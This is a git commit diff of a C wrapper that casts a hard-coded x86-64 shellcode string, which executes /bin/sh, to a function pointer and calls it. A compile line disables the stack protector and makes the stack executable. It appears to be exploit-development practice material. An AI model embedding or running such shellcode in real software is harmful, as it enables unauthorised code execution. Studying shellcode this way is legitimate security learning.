5653aed5b73843d08afd654ae5acca405cd538c8
Marietteth78 <99668021+Marietteth78@users.noreply.github.com>
2023-01-11 16:16:43 +0100

    Update wrapper.c

--- wrapper/wrapper.c
+++ wrapper/wrapper.c
@@ -2,17 +2,13 @@
 #include <stdio.h>
 #include <string.h>
 
+char code[] = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";
 
-
-int main()
+int main(int argc, char **argv)
 {
-	char shellcode[] = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";
-	
-   	printf("lenght shellcode %d\n", strlen(shellcode));
-    
-    	int (ret)() = (int()())shellcode;
-    	ret();
-    	return 0;
+        int (*func)(); // déclare un pointeur de fonction pour une fonction, arguments non spécifiés et retourne un int
+        func = (int (*)()) code; // initialise le pointer en le faisant pointer sur code
+        (int)(*func)(); // appel de fonction
 }
 
 //Compilation : gcc -fno-stack-protector -z execstack wrapper.c -o wrapper
